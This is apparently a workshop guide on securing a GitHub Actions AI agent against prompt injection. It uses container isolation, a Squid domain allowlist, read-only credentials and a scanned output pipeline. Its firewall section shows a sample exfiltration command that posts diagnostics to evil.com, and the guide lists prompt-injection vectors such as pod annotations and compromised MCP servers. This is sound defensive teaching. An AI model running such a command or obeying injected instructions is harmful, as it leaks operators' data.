# Act 4: Agents Shouldn't Have the Keys to the Kingdom

> **Workshop Goal:** Add defense-in-depth security to your agentic workflows using container isolation, network firewalls, and gated output pipelines - the same patterns GitHub Next uses in Agentic Workflows (gh-aw).

---

## The Scene: The Agent That Knew Too Much

Your Cluster Doctor agent from Act 3 is working great. It diagnoses failures, posts findings to issues, and opens PRs with fixes. The team loves it.

Then someone asks: **"What stops the agent from doing something we didn't ask for?"**

Look at the original workflow:

```yaml
permissions:
  id-token: write
  contents: write
  issues: write
  pull-requests: write
```

The agent has:
- **Write access to your repo** (it could push code to main)
- **Write access to issues and PRs** (it could spam your issue tracker)
- **Azure OIDC credentials** (it could talk to your cloud resources)
- **Full network access** (it could send data anywhere on the internet)
- **Direct runner access** (it could read environment variables, other secrets)

You trust the agent's *intent* - but what about prompt injection? A malicious pod annotation, a crafted event message, or a compromised MCP server could manipulate the agent into doing things you never intended.

**The question isn't "will the agent misbehave?" It's "what happens when it does?"**

---

## The Insight: Separate Thinking from Acting

[GitHub Next Agentic Workflows (gh-aw)](https://github.github.com/gh-aw/) solves this with a principle: **the agent can think freely, but its ability to act is constrained by architecture, not trust.**

Their security model has five layers:

| Layer | What it does |
|-------|-------------|
| Container isolation | Agent runs in a Docker container, not on the bare runner |
| Network firewall | Squid proxy enforces a domain allowlist - agent can only reach approved destinations |
| Scoped credentials | Agent gets a read-only token - it can observe but not modify |
| Safe outputs | Agent proposes actions as structured data; a separate job validates, sanitizes, and applies them |
| Permission separation | Agent job and write job have different permission sets |

The problem: gh-aw is repo-scoped. It works great for code analysis, documentation, and issue triage. But it can't reach your Kubernetes cluster, your Azure resources, or your internal APIs. The sandbox blocks external access by design.

**The pattern we'll build:** Apply gh-aw's security principles to workflows that need external access, using two composable GitHub Actions.

---

## Architecture: Three Jobs, Five Layers

```
Job 1: Diagnose              Job 2: Scan              Job 3: Apply
(read-only creds)            (zero creds)             (write token only)

+---------------------------+
| Docker (--internal net)   |
|                           |
| +-------+  +---------+   |
| | Agent  |->| Squid   |--+--> allowed       Constraint    Download
| |        |  | proxy   |  |    domains only   validation    scanned output
| +-------+  +---------+   |                                
+---------------------------+                   Secret       Apply via
         |                                      sanitization GitHub API
         v artifact                                          
                                                AI threat    
                                                detection    
                                                             
                                                dry-run (no  
                                                writes here) 
```

**Job 1 - Diagnose:** The agent runs inside a network-isolated container. It has read-only access to the cluster and can follow diagnostic threads freely. All HTTP/HTTPS traffic routes through a Squid proxy that enforces a domain allowlist defined in the workflow YAML. The agent produces a structured JSON artifact describing the actions it wants to take.

**Job 2 - Scan:** No credentials of any kind. Downloads the agent's artifact and runs it through constraint validation (max issues, title prefixes, label allowlists), secret sanitization (regex patterns for tokens, connection strings, keys), and AI-powered threat detection (prompt injection, malicious code, social engineering). If anything fails, the workflow stops. Nothing gets written.

**Job 3 - Apply:** Has a GitHub write token but no agent, no cluster credentials, and no AI reasoning. Mechanically applies the validated, sanitized output from Job 2.

---

## The Two Actions

This pattern is implemented as two composable GitHub Actions:

### [agent-sandbox-action](https://github.com/microsoftgbb/agent-sandbox-action) - Input containment

Wraps your agent in a network-isolated Docker container:

```yaml
- uses: microsoftgbb/agent-sandbox-action@v1
  with:
    command: |
      copilot -p "Diagnose the cluster..." --agent cluster-doctor
    allowed-domains: |
      api.githubcopilot.com
      api.github.com
      .azmk8s.io
    env-vars: |
      GITHUB_TOKEN=${{ secrets.COPILOT_CLI_TOKEN }}
```

What it does:
- Creates a Docker network with `--internal` (no direct internet)
- Starts a Squid proxy on that network, connected to bridge for outbound
- Runs the agent container with `HTTP_PROXY`/`HTTPS_PROXY` pointed at the proxy
- Only domains in `allowed-domains` can be reached
- Proxy access log provides a full audit trail of every domain the agent contacted

### [safe-outputs-action](https://github.com/microsoftgbb/safe-outputs-action) - Output gate

Validates, sanitizes, and applies the agent's proposed actions:

```yaml
- uses: microsoftgbb/safe-outputs-action@v1
  with:
    artifact-path: agent-output.json
    max-comments: 2
    max-pull-requests: 1
    title-prefix: "[cluster-doctor] "
    allowed-labels: "cluster-doctor,bug,investigation"
    threat-detection: true
```

What it does:
- **Constraint validation** - enforces limits on how many issues, comments, and PRs the agent can create; requires title prefixes; restricts labels
- **Secret sanitization** - scans all output fields for JWTs, Azure connection strings, AWS keys, GitHub PATs, private keys, and custom patterns
- **AI threat detection** - optional Copilot CLI scan for prompt injection, encoded credentials, malicious code, and social engineering
- **File-based PR creation** - agent provides a `files` map; the action creates branches and commits via the Git Data API

---

## Agent Output Schema

The agent produces a JSON file describing the actions it wants to take. The safe-outputs action validates and applies them:

```json
{
  "version": "1",
  "actions": [
    {
      "type": "issue_comment",
      "issue_number": 42,
      "body": "## Cluster Doctor Report\n\nFindings here..."
    },
    {
      "type": "create_pull_request",
      "title": "[cluster-doctor] Fix HPA max replicas",
      "body": "Analysis found HPA ceiling too low for current load.",
      "head": "cluster-doctor/fix-hpa",
      "files": {
        "k8s/hpa.yaml": "apiVersion: autoscaling/v2\nkind: HorizontalPodAutoscaler\nmetadata:\n  name: my-app\nspec:\n  maxReplicas: 10"
      }
    }
  ]
}
```

Supported action types:

| Type | Description |
|------|-------------|
| `issue_comment` | Add a comment to an existing issue or PR |
| `create_issue` | Create a new issue |
| `create_pull_request` | Create a PR, optionally with inline file contents |
| `add_labels` | Add labels to an existing issue or PR |

---

## Full Example: Secured Cluster Doctor

Here is the cluster-doctor workflow from Act 3, refactored with all five security layers:

```yaml
name: "Cluster Doctor (Safe Outputs)"

on:
  workflow_dispatch:
  repository_dispatch:
    types: [cluster-doctor-trigger]
  issues:
    types: [labeled, opened]

permissions:
  contents: read

# Domain allowlist - the ONLY domains the agent can reach
env:
  AGENT_ALLOWED_DOMAINS: |
    api.githubcopilot.com
    api.github.com
    .azmk8s.io
    login.microsoftonline.com
    management.azure.com

jobs:
  # ── Job 1: Diagnose (read-only creds, sandboxed agent) ──
  diagnose:
    if: |
      github.event_name == 'workflow_dispatch' || 
      github.event.label.name == 'cluster-doctor'
    environment: copilot
    runs-on: ubuntu-latest
    permissions:
      id-token: write    # Azure OIDC (scoped to read-only role)
      contents: read
      issues: read

    steps:
      - uses: actions/checkout@v5

      # ... (parse cluster info, Azure login, get AKS credentials) ...

      - name: Run agent in sandbox
        uses: microsoftgbb/agent-sandbox-action@v1
        with:
          allowed-domains: |
            ${{ env.AGENT_ALLOWED_DOMAINS }}
            ${{ steps.aks.outputs.api_server }}
          env-vars: |
            GITHUB_TOKEN=${{ secrets.COPILOT_CLI_TOKEN }}
            GITHUB_MCP_TOKEN=${{ secrets.GITHUB_TOKEN }}
            KUBECONFIG=/home/agent/.kube/config
          extra-mounts: |
            ${{ env.HOME }}/.kube/config:/home/agent/.kube/config:ro
          command: |
            kubectl port-forward -n aks-mcp svc/aks-mcp 8000:8000 &
            sleep 3
            copilot -p "Diagnose the cluster..." \
              --agent cluster-doctor \
              --additional-mcp-config @'.copilot/mcp-config.json' \
              --allow-all-tools

      - uses: actions/upload-artifact@v4
        with:
          name: agent-output
          path: agent-output.json

  # ── Job 2: Scan (zero creds, circuit breaker) ──
  scan:
    needs: diagnose
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: agent-output

      - uses: microsoftgbb/safe-outputs-action@v1
        with:
          artifact-path: agent-output.json
          max-comments: 2
          max-pull-requests: 1
          title-prefix: "[cluster-doctor] "
          allowed-labels: "cluster-doctor,bug,investigation"
          threat-detection: true
          dry-run: true
          custom-secret-patterns: |
            10\.0\.\d+\.\d+
            aks-[a-z0-9]{8,}

      - uses: actions/upload-artifact@v4
        with:
          name: scanned-output
          path: agent-output.json
          overwrite: true

  # ── Job 3: Apply (write token only, no agent) ──
  apply:
    needs: [diagnose, scan]
    runs-on: ubuntu-latest
    permissions:
      issues: write
      contents: write
      pull-requests: write
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: scanned-output

      - uses: microsoftgbb/safe-outputs-action@v1
        with:
          artifact-path: agent-output.json
          max-comments: 2
          max-pull-requests: 1
          title-prefix: "[cluster-doctor] "
          allowed-labels: "cluster-doctor,bug,investigation"
```

---

## What Changed from Act 3

| Dimension | Act 3 (original) | Act 4 (secured) |
|-----------|------------------|-----------------|
| Agent environment | Bare runner, full access | Docker container, isolated network |
| Network access | Unrestricted internet | Squid proxy, domain allowlist |
| GitHub permissions | `contents: write`, `issues: write`, `pull-requests: write` in agent job | `contents: read`, `issues: read` in agent job; writes in separate job |
| How agent writes | Direct MCP calls to GitHub API | Produces JSON artifact, validated and applied by separate job |
| Secret exposure | Agent has all env vars including tokens | Agent has only scoped read-only credentials |
| Audit trail | GitHub Actions logs only | Proxy access log of every domain the agent contacted |
| Threat detection | None | AI-powered scan + regex sanitization |
| Output constraints | None - agent can create unlimited issues/PRs | Configurable limits, title prefixes, label allowlists |

---

## The Domain Allowlist: Your Network Firewall

The allowlist is defined in plain YAML at the top of the workflow:

```yaml
env:
  AGENT_ALLOWED_DOMAINS: |
    api.githubcopilot.com        # Copilot model API
    api.github.com               # GitHub MCP (read-only)
    .azmk8s.io                   # AKS cluster API servers
    login.microsoftonline.com    # Azure AD token exchange
    management.azure.com         # Azure ARM (read-only)
```

The `.` prefix matches all subdomains (Squid dstdomain syntax). The cluster API server FQDN is appended dynamically at runtime.

If the agent (or a prompt injection attack) tries to reach any other domain:

```
curl https://evil.com/exfil -d @diagnostics.json
# Connection refused - domain not in allowlist
```

The proxy access log records every request, providing a full audit trail:

```
1713139200.123 200 CONNECT api.githubcopilot.com:443
1713139201.456 200 CONNECT api.github.com:443
1713139202.789 403 CONNECT evil.com:443            # BLOCKED
```

---

## Recommended K8s RBAC

The AKS MCP server should use a read-only ClusterRole:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: cluster-doctor-readonly
rules:
  - apiGroups: [""]
    resources: [pods, events, nodes, services, namespaces]
    verbs: [get, list]
  - apiGroups: [""]
    resources: [pods/log]
    verbs: [get]
  - apiGroups: [apps]
    resources: [deployments, replicasets, daemonsets, statefulsets]
    verbs: [get, list]
  - apiGroups: [autoscaling]
    resources: [horizontalpodautoscalers]
    verbs: [get, list]
  # NO secrets, NO configmaps, NO write verbs
```

The agent can freely explore within these boundaries - checking pod logs when it sees crashes, inspecting HPA config when it sees scaling issues, tracing dependency chains across resources - but it cannot read secrets or mutate anything.

---

## How This Compares to gh-aw

| Layer | gh-aw | This pattern |
|-------|-------|-------------|
| Container isolation | Built-in | `agent-sandbox-action` |
| Network firewall | AWF (Squid + iptables) | Squid + `--internal` Docker network |
| Domain config | Workflow markdown | Workflow YAML `env` block |
| Scoped credentials | Read-only GitHub token | Read-only K8s + Azure + GitHub |
| Safe outputs | Built-in (tightly coupled to runtime) | `safe-outputs-action` (standalone) |
| Threat detection | Built-in AI scan | Copilot CLI scan |
| Scope | Repo only (no external systems) | Any system the agent can reach |

The key difference: gh-aw's sandbox works because it only needs to reach GitHub APIs. When your agent needs to talk to Kubernetes clusters, Azure resources, or other external systems, you need the same security patterns with a wider aperture for input sources. That is what these two actions provide.

---

## Workshop Activity (30 minutes)

### Part 1: Secure the Cluster Doctor (15 min)

1. Look at the original cluster-doctor workflow from Act 3
2. Identify which permissions the agent has that it doesn't need
3. Add `agent-sandbox-action` to the workflow with an appropriate domain allowlist
4. Add `safe-outputs-action` with constraints that match your team's policies

### Part 2: Test the Guardrails (15 min)

1. Run the secured workflow with `dry-run: true` on safe-outputs
2. Review the proxy access log - what domains did the agent contact?
3. Modify the agent prompt to ask for output that violates a constraint (e.g., missing title prefix)
4. Verify the scan job blocks it

### Discussion Questions

- What domains does your agent actually need? Start with zero and add as needed.
- What's the right max-comments / max-pull-requests for your team's workflows?
- Should `fail-on-sanitize` be true (strict) or false (redact and proceed)?
- How would you add a human approval step between scan and apply?

---

## Key Takeaways

1. **Trust the architecture, not the agent.** A well-scoped agent with guardrails is safer than a "smart" agent with full access. The agent will eventually be confused or manipulated - what matters is the blast radius.

2. **Separate thinking from acting.** The agent can reason freely with read-only access. Its proposed actions go through validation, sanitization, and threat detection before anything is written.

3. **The domain allowlist is your network firewall.** Start with the minimum domains your agent needs. Every additional domain increases the exfiltration surface.

4. **Output constraints catch what prompts can't prevent.** No matter how good your system prompt is, the agent might produce unexpected output. Hard limits on issues, required title prefixes, and label allowlists provide a deterministic safety net.

5. **Audit trails matter.** The proxy access log and the safe-outputs summary give you visibility into exactly what the agent did and what it tried to do.
